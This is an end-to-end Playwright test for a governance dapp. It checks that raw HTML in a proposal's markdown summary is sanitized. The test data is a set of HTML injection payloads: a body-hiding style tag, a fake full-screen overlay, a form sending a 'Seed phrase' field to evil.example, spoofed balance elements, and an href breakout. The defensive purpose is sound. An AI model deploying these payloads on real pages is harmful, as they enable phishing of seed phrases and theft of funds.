import { AppPo } from "$tests/page-objects/App.page-object";
import { PlaywrightPageObjectElement } from "$tests/page-objects/playwright.page-object";
import { createDummyProposal } from "$tests/utils/e2e.nns-proposals.test-utils";
import {
  disableCssAnimations,
  signInWithNewUser,
  step,
} from "$tests/utils/e2e.test-utils";
import { ProposalStatus, Topic } from "@icp-sdk/canisters/nns";
import { expect, test } from "@playwright/test";

// Whoever submits a proposal writes its summary. The summary is rendered as
// markdown, and markdown keeps raw HTML. This test submits a real proposal
// whose summary carries markup, then reads the rendered page.
//
// The last line of the summary marks the end of the rendering, so the test
// knows when the Markdown component is done.
const MARKER = "end of the injected summary";

const INJECTED_SUMMARY = `# Injection test

Some **bold** text and a [link](https://internetcomputer.org/).

<div><style>body { display: none !important; }</style></div>

<p style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#ffffff;z-index:99999">Fake overlay</p>

<form action="https://evil.example/"><label>Seed phrase</label><input name="injected-seed"><button>Claim</button></form>

<div class="content-cell-island" id="injected-id" data-tid="injected-tid"><p class="value">Balance: 0 ICP</p></div>

[click](https://a.example"><form><input name="injected-href-seed"></form>)

${MARKER}
`;

// The app loads this script to create the dummy proposals of a testnet. The
// test serves its own version, so that one proposal carries the summary above.
// See frontend/src/lib/api/dev.api.ts and
// frontend/static/assets/libs/dummy-proposals.utils.js.
const DUMMY_PROPOSALS_SCRIPT_PATH = "**/assets/libs/dummy-proposals.utils.js";

const dummyProposalsModule = `
export const makeDummyProposals = async ({ neuronId, canister }) => {
  await canister.makeProposal({
    neuronId,
    title: "Test proposal title - markup in the summary",
    url: "https://forum.dfinity.org/t/announcing-juno-build-on-the-ic-using-frontend-code-only",
    summary: ${JSON.stringify(INJECTED_SUMMARY)},
    action: {
      Motion: {
        motionText: "A motion whose summary carries markup.",
      },
    },
  });
};
`;

test("Test a proposal summary that carries markup", async ({
  page,
  context,
}) => {
  step("Serve a dummy proposal whose summary carries markup");
  await page.route(DUMMY_PROPOSALS_SCRIPT_PATH, (route) =>
    route.fulfill({
      status: 200,
      contentType: "application/javascript",
      body: dummyProposalsModule,
    })
  );

  await page.goto("/");
  await disableCssAnimations(page);
  await expect(page).toHaveTitle("Portfolio | Network Nervous System");

  await signInWithNewUser({ page, context });

  const pageElement = PlaywrightPageObjectElement.fromPage(page);
  const appPo = new AppPo(pageElement);

  step("Get some ICP");
  await appPo.getIcpTokens(21);

  step("Stake a neuron for voting");
  await appPo.goToStaking();
  await appPo
    .getStakingPo()
    .stakeFirstNnsNeuron({ amount: 10, dissolveDelayDays: "max" });

  step("Create the proposal");
  const proposerNeuronId = await createDummyProposal(appPo);

  step("Open the Internet Computer proposals");
  await appPo.goToProposals();
  await appPo.openUniverses();
  await appPo.getSelectUniverseListPo().clickOnInternetComputer();
  const nnsProposalListPo = appPo.getProposalsPo().getNnsProposalListPo();
  await nnsProposalListPo.waitForContentLoaded();

  await appPo
    .getProposalsPo()
    .getNnsProposalFiltersPo()
    .getActionableProposalsSegmentPo()
    .clickAllProposals();

  step("Filter the open Governance proposals");
  await appPo
    .getProposalsPo()
    .getNnsProposalFiltersPo()
    .selectTopicFilter([Topic.Governance]);
  await nnsProposalListPo.waitForContentLoaded();
  await appPo
    .getProposalsPo()
    .getNnsProposalFiltersPo()
    .selectStatusFilter([ProposalStatus.Open]);
  await nnsProposalListPo.waitForContentLoaded();

  step("Open the proposal");
  const proposalCard =
    await nnsProposalListPo.getFirstProposalCardPoForProposer(proposerNeuronId);
  await proposalCard.click();
  await appPo.getProposalDetailPo().getNnsProposalPo().waitForContentLoaded();

  step("Wait for the summary");
  const summary = page.locator(
    "[data-tid=proposal-summary-component] .markdown-container"
  );
  await expect(summary).toContainText(MARKER);

  step("Check that the markdown still renders");
  await expect(summary.locator("h1")).toHaveText("Injection test");
  await expect(summary.locator("strong")).toHaveText("bold");
  const link = summary.locator('a[href="https://internetcomputer.org/"]');
  await expect(link).toHaveText("link");

  step("Check that the injected markup is gone");
  expect(await summary.locator("style").count()).toBe(0);
  expect(await summary.locator("[style]").count()).toBe(0);
  expect(await summary.locator("form").count()).toBe(0);
  expect(await summary.locator("input").count()).toBe(0);
  expect(await summary.locator("button").count()).toBe(0);
  expect(await summary.locator("[id]").count()).toBe(0);
  expect(await summary.locator("[data-tid]").count()).toBe(0);
  // The summary holds no fenced code block, so no class survives at all.
  expect(await summary.locator("[class]").count()).toBe(0);

  step("Check that the injected text stays visible");
  // A rejected tag is unwrapped, so the reader still sees its text.
  await expect(summary).toContainText("Fake overlay");
  await expect(summary).toContainText("Balance: 0 ICP");

  step("Check that the page is not hidden");
  const bodyDisplay = await page.evaluate(
    () => getComputedStyle(document.body).display
  );
  expect(bodyDisplay).not.toBe("none");
  await expect(page.locator("[data-tid=nns-proposal-component]")).toBeVisible();

  step("Check that a new tab gets no access to the app");
  const targetLinks = await summary.locator('a[target="_blank"]').all();
  for (const targetLink of targetLinks) {
    expect(await targetLink.getAttribute("rel")).toBe("noopener noreferrer");
  }
});
